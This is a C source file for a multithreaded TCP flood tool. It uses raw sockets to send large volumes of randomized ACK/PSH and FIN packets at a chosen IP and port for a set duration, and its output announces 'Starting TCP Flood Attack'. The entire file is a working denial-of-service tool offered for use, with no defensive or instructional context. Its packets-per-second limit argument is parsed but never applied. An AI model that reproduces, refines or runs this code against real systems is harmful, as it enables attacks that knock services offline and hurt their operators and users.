/*
 * TCP Flood Tool - Optimized Version
 * Improved code structure and performance
 */

#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <stdint.h>  // Añadido para uint32_t

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define MIN_PAYLOAD 90
#define MAX_PAYLOAD 120
#define FIN_PACKET_INTERVAL 1000
#define MAX_IP_PORT_LEN 32  // Suficiente para "255.255.255.255:65535"

// Configuration structure
typedef struct {
    char target_ip[16];
    unsigned int target_port;
    unsigned int threads;
    int pps_limit;
    unsigned int duration;
} config_t;

// Thread data structure
typedef struct {
    char target_ip[MAX_IP_PORT_LEN];  // Aumentado de 16 a 32
    int thread_id;
    volatile int *running;
} thread_data_t;

// Global variables
static unsigned long int Q[4096];
static unsigned long int c = 362436;
static volatile unsigned int packets_sent = 0;
static volatile int global_running = 1;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// Random number generator (Complementary Multiply With Carry)
void init_rand(unsigned long int seed) {
    Q[0] = seed;
    Q[1] = seed + PHI;
    Q[2] = seed + PHI + PHI;
    
    for (int i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void) {
    static unsigned long int i = 4095;
    unsigned long long t;
    const unsigned long long a = 18782LL;
    const unsigned long int r = 0xfffffffe;
    
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (unsigned long int)(t >> 32);
    unsigned long int x = (unsigned long int)t + c;
    
    if (x < c) {
        x++;
        c++;
    }
    
    return (Q[i] = r - x);
}

// Checksum calculation
unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    
    if (nbytes == 1) {
        unsigned short oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }
    
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    
    return (unsigned short)~sum;
}

// Get external IP address
uint32_t get_external_address(void) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket() failed");
        return INADDR_ANY;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);
    
    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect() failed");
        close(fd);
        return INADDR_ANY;
    }
    
    socklen_t addr_len = sizeof(addr);
    if (getsockname(fd, (struct sockaddr *)&addr, &addr_len) < 0) {
        perror("getsockname() failed");
        close(fd);
        return INADDR_ANY;
    }
    
    close(fd);
    return addr.sin_addr.s_addr;
}

// Create raw socket
int create_raw_socket(void) {
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("socket() failed - run as root");
        return -1;
    }
    
    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt(IP_HDRINCL) failed");
        close(s);
        return -1;
    }
    
    return s;
}

// Setup TCP header with random values
void setup_tcp_header(struct tcphdr *tcp, unsigned short dest_port, int is_fin) {
    tcp->source = htons(rand_cmwc() & 0xFFFF);
    tcp->dest = htons(dest_port);
    tcp->seq = htonl(rand_cmwc());
    tcp->ack_seq = htonl(rand_cmwc());
    tcp->doff = 5;
    tcp->window = htons(rand_cmwc() & 0xFFFF);
    tcp->check = 0;
    tcp->urg_ptr = 0;
    
    // Set flags
    tcp->ack = 1;
    tcp->psh = is_fin ? 0 : 1;
    tcp->fin = is_fin ? 1 : 0;
    tcp->syn = 0;
    tcp->rst = 0;
    tcp->urg = 0;
}

// Create and send packet
void send_packet(int sockfd, const struct sockaddr_in *target, 
                 uint32_t source_ip, int is_fin) {
    static char packet[MAX_PACKET_SIZE];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(ip + 1);
    char *payload = (char *)(tcp + 1);
    
    // Generate random payload
    int payload_len = MIN_PAYLOAD + (rand_cmwc() % (MAX_PAYLOAD - MIN_PAYLOAD + 1));
    
    // Fill payload with random data
    for (int i = 0; i < payload_len; i++) {
        payload[i] = rand_cmwc() & 0xFF;
    }
    
    // Setup IP header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    ip->id = htons(rand_cmwc() & 0xFFFF);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->saddr = source_ip;
    ip->daddr = target->sin_addr.s_addr;
    
    // Calculate IP checksum
    ip->check = calculate_checksum((unsigned short *)ip, sizeof(struct iphdr));
    
    // Setup TCP header
    setup_tcp_header(tcp, ntohs(target->sin_port), is_fin);
    
    // Calculate TCP checksum (pseudo-header)
    struct {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t zero;
        uint8_t protocol;
        uint16_t tcp_len;
    } pseudo_header;
    
    pseudo_header.src_addr = ip->saddr;
    pseudo_header.dst_addr = ip->daddr;
    pseudo_header.zero = 0;
    pseudo_header.protocol = IPPROTO_TCP;
    pseudo_header.tcp_len = htons(sizeof(struct tcphdr) + payload_len);
    
    // Combine pseudo header and TCP segment for checksum
    int pseudo_len = sizeof(pseudo_header) + sizeof(struct tcphdr) + payload_len;
    char *pseudo_packet = malloc(pseudo_len);
    
    if (!pseudo_packet) {
        perror("malloc() failed");
        return;
    }
    
    memcpy(pseudo_packet, &pseudo_header, sizeof(pseudo_header));
    memcpy(pseudo_packet + sizeof(pseudo_header), tcp, sizeof(struct tcphdr) + payload_len);
    
    tcp->check = calculate_checksum((unsigned short *)pseudo_packet, pseudo_len);
    free(pseudo_packet);
    
    // Send packet
    if (sendto(sockfd, packet, ntohs(ip->tot_len), 0,
               (struct sockaddr *)target, sizeof(*target)) < 0) {
        if (errno != ENOBUFS) {
            perror("sendto() failed");
        }
    } else {
        pthread_mutex_lock(&stats_mutex);
        packets_sent++;
        pthread_mutex_unlock(&stats_mutex);
    }
}

// Flood thread function
void *flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    
    // Parse target IP and port from the string
    char target_ip[16];
    unsigned short target_port;
    char *colon = strchr(data->target_ip, ':');
    
    if (colon) {
        size_t ip_len = colon - data->target_ip;
        if (ip_len >= sizeof(target_ip)) {
            ip_len = sizeof(target_ip) - 1;
        }
        strncpy(target_ip, data->target_ip, ip_len);
        target_ip[ip_len] = '\0';
        target_port = (unsigned short)atoi(colon + 1);
    } else {
        strncpy(target_ip, data->target_ip, sizeof(target_ip) - 1);
        target_ip[sizeof(target_ip) - 1] = '\0';
        target_port = 80;  // Default port
    }
    
    // Setup target address
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(target_ip);
    target.sin_port = htons(target_port);
    
    // Validate target address
    if (target.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Thread %d: Invalid target IP address: %s\n", 
                data->thread_id, target_ip);
        free(data);
        pthread_exit(NULL);
    }
    
    // Get source IP and create socket
    uint32_t source_ip = get_external_address();
    int sockfd = create_raw_socket();
    
    if (sockfd < 0) {
        free(data);
        pthread_exit(NULL);
    }
    
    printf("Thread %d started - Target: %s:%u\n", 
           data->thread_id, target_ip, target_port);
    
    unsigned int packet_count = 0;
    
    while (*data->running) {
        // Send normal packet
        send_packet(sockfd, &target, source_ip, 0);
        packet_count++;
        
        // Send FIN packet every N packets
        if (packet_count % FIN_PACKET_INTERVAL == 0) {
            send_packet(sockfd, &target, source_ip, 1);
        }
        
        // Small delay to prevent overwhelming the system
        usleep(10);
    }
    
    close(sockfd);
    free(data);
    return NULL;
}

// Print statistics
void print_stats(void) {
    time_t start_time = time(NULL);
    
    while (global_running) {
        sleep(1);
        
        pthread_mutex_lock(&stats_mutex);
        unsigned int current_pps = packets_sent;
        packets_sent = 0;
        pthread_mutex_unlock(&stats_mutex);
        
        printf("\rPackets/s: %u | Running for: %ld seconds", 
               current_pps, time(NULL) - start_time);
        fflush(stdout);
    }
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, 
            "Usage: %s <target IP> <port> <threads> <pps limit> <duration in seconds>\n"
            "Example: %s 192.168.1.1 80 10 1000 60\n",
            argv[0], argv[0]);
        return EXIT_FAILURE;
    }
    
    // Parse arguments
    config_t config;
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_ip[sizeof(config.target_ip) - 1] = '\0';
    config.target_port = (unsigned int)atoi(argv[2]);
    config.threads = (unsigned int)atoi(argv[3]);
    config.pps_limit = atoi(argv[4]);
    config.duration = (unsigned int)atoi(argv[5]);
    
    // Validate arguments
    if (config.threads < 1 || config.threads > 1000) {
        fprintf(stderr, "Error: Thread count must be between 1 and 1000\n");
        return EXIT_FAILURE;
    }
    
    if (config.duration < 1) {
        fprintf(stderr, "Error: Duration must be at least 1 second\n");
        return EXIT_FAILURE;
    }
    
    printf("Starting TCP Flood Attack\n");
    printf("Target: %s:%u\n", config.target_ip, config.target_port);
    printf("Threads: %u | Duration: %u seconds\n", config.threads, config.duration);
    printf("Press Ctrl+C to stop\n\n");
    
    // Initialize random generator
    init_rand(time(NULL));
    
    // Create threads
    pthread_t *threads = malloc(config.threads * sizeof(pthread_t));
    if (!threads) {
        perror("malloc() failed");
        return EXIT_FAILURE;
    }
    
    for (unsigned int i = 0; i < config.threads; i++) {
        thread_data_t *data = malloc(sizeof(thread_data_t));
        if (!data) {
            perror("malloc() failed");
            continue;
        }
        
        // Formatear IP:Puerto de forma segura
        int written = snprintf(data->target_ip, sizeof(data->target_ip), 
                              "%s:%u", config.target_ip, config.target_port);
        if (written < 0 || (size_t)written >= sizeof(data->target_ip)) {
            fprintf(stderr, "Warning: Truncated target string for thread %u\n", i);
            data->target_ip[sizeof(data->target_ip) - 1] = '\0';
        }
        
        data->thread_id = i;
        data->running = &global_running;
        
        if (pthread_create(&threads[i], NULL, flood_thread, data) != 0) {
            perror("pthread_create() failed");
            free(data);
        }
    }
    
    // Start statistics thread
    pthread_t stats_thread;
    if (pthread_create(&stats_thread, NULL, (void *(*)(void *))print_stats, NULL) != 0) {
        perror("Failed to create stats thread");
        global_running = 0;
    }
    
    // Run for specified duration
    sleep(config.duration);
    global_running = 0;
    
    // Wait for threads to finish
    for (unsigned int i = 0; i < config.threads; i++) {
        if (threads[i] != 0) {
            pthread_join(threads[i], NULL);
        }
    }
    
    if (stats_thread != 0) {
        pthread_join(stats_thread, NULL);
    }
    
    free(threads);
    pthread_mutex_destroy(&stats_mutex);
    
    printf("\nAttack finished\n");
    return EXIT_SUCCESS;
}
